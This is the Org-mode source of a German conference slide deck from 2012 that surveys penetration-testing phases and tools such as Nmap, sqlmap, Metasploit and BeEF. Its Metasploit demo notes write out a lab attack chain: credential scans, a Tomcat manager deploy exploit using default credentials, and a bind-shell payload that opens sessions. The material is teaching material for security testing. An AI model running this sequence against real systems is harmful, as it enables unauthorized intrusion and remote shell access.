#+STARTUP: beamer
#+LaTeX_CLASS: beamer
#+MACRO: BEAMERMODE presentation
#+MACRO: BEAMERTHEME Berlin
#+MACRO: BEAMERCOLORTHEME crane
#+MACRO: BEAMERINSTITUTE Linuxwochen 2012
#+TITLE: A Pentester's Best Friends
#+AUTHOR: Michael Kohl, Ludwig Hammel

* Einleitung
** Die Vortragenden
*** Penetration Tester und Software-Entwickler
*** base-camp IT Security & Solutions
*** http://www.base-camp.cc/
** Warum Penetration Testing?
*** Schwachstellen identifizieren
*** Aufdecken von Fehlern aus falscher Bedienung
*** Erhöhung der Sicherheit auf technischer und organisatorischer Ebene
*** externe Validierung der Sicherheit
** Ablauf eines Penetration Test
*** Pre-Engagement
**** Zieldefinition, Umfang, Rahmenbedingungen
*** Intelligence Gathering
**** Footprinting, Portscans, Google, Social Media
*** Threat Modeling
**** Angriffsvektor, interessante Ziele
*** Vulnerability Analysis
**** Port- u. Servicescans, Banner Grabbing, Traffic Monitoring
*** Exploitation
**** Buffer Overflows, SQL Injections, Bruteforce
*** Post Exploitation
**** Weitere Exploits, Aufräumen
* Tools
** owtf
*** Offensive Web Testing Framework
*** Information Gathering
*** Vulnerability Analysis
*** passsive, semi-passive, active
*** On-the-fly Report Updates
*** Demo :noexport:
****
** Nmap
*** Ursprünglich Portscanner
*** Mittlerweile umfangreicher Security-Scanner
*** Intelligence Gathering & Vulnerability Analysis
*** Nmap Scripting Engine (NSE)
** Nmap Demo
*** Simpler Portscan
**** =nmap linuxwochen.at=
*** Komplizierterer Portscan (OS Detection, Port-Range, Service/Version Detection)
**** =nmap -O -sV -p 1-2048 linuxwochen.at=
*** Portscan mit Standardskripts (Wie oben plus Standardskripts und Traceroute)
****  =nmap -A linuxwochen.at=
*** Portscan mit Extra Skripts
**** =nmap --script=http-generator,banner -p21,80 linuxwochen.at=
** NSE kurz
*** Nmap Scripting Engine
*** Lua
*** > 350 Skripts
*** Kategorien: default, discovery, dos, exploit, malware, safe...
** NSE Beispiel
...
** sqlmap
*** Für MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, SQLite, Firebird, Sybase und SAP MaxDB
*** Verschiedene SQL Injection Techniken
*** Enumeration von Benutzern, Tabellen, Benutzerrollen und -berechtigungen...
*** Datenbanken/Tabellen dumpen
*** File Upload/Download bei MySQL, PostgreSQL und Microsoft SQL Server
*** Demo?
** Metasploit
*** Sehr umfangreiches Pen Testing Framework
*** Geschrieben und erweiterbar in Ruby (früher Perl)
*** Scanning, Vulnerability Analysis, Exploitation, Post Exploitation
*** Demo :noexport:
msf > db_connect ...

sudo nmap -sT -Pn 10.20.30.164 -oX metasploitable.xml

msf > db_import metasploitable.xml
[*] Importing 'Nmap XML' data
[*] Importing host 10.20.30.164
[*] Successfully imported /Users/michi/metasploitable.xml

msf > db_services

msf > setg RHOSTS 10.20.30.164
RHOSTS => 10.20.30.164

msf > use scanner/ftp/anonymous
msf auxiliary(anonymous) > show options
msf auxiliary(anonymous) > run

msf > search postgres

msf auxiliary(anonymous) > use scanner/postgres/postgres_login
msf auxiliary(postgres_login) > show options

msf auxiliary(postgres_login) > run
BAZINGA!

psql -h 192.168.178.30 -U postgres
\\du

msf > use scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
msf auxiliary(tomcat_mgr_login) > run
BAZINGA!

msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
USERNAME => tomcat
msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
PASSWORD => tomcat
msf exploit(tomcat_mgr_deploy) > set RHOST 10.20.30.164
RHOST => 192.168.178.30
msf exploit(tomcat_mgr_deploy) > set PAYLOAD linux/x86/shell_bind_tcp
msf exploit(tomcat_mgr_deploy) > exploit -j
msf exploit(tomcat_mgr_deploy) > sessions -l
msf exploit(tomcat_mgr_deploy) > sessions -i n
** Arachni
*** Web Application Security Scanner Framework
*** Geschrieben in Ruby
*** Spider mit asynchronem HTTP
*** Als Library verwendbar
*** Web Interface
*** Demo :noexport:
**** archachni http://linuxwochen,at
** BeEF
*** Browser Exploitation Framework
*** Geschrieben in Ruby und JavaScript
*** Fokussiert auf Browser Schwachstellen
*** Clientseitige Angriffe
** Dradis
*** Post Exploitation Reporting
*** Geschrieben in Ruby
** Diverse Tools
*** ab/Siege: Lasttests, Benchmarking, DoS
*** John the Ripper:
*** ophcrack:
*** Kombinierbar
* Distributionen
** Distributionen
*** BackTrack
*** Grml
*** OWASP Labrat
**** Open Web Application Security Project
*** ophcrack Live CD
* Links
** Links
*** http://base-camp.cc
*** http://dradisframework.org/
*** http://www.securitydistro.com/
*** Metasploit: http://www.metasploit.com/
*** Siege: http://www.joedog.org/
*** John the Ripper: http://www.openwall.com/john/
*** BeEF: http://beefproject.com/
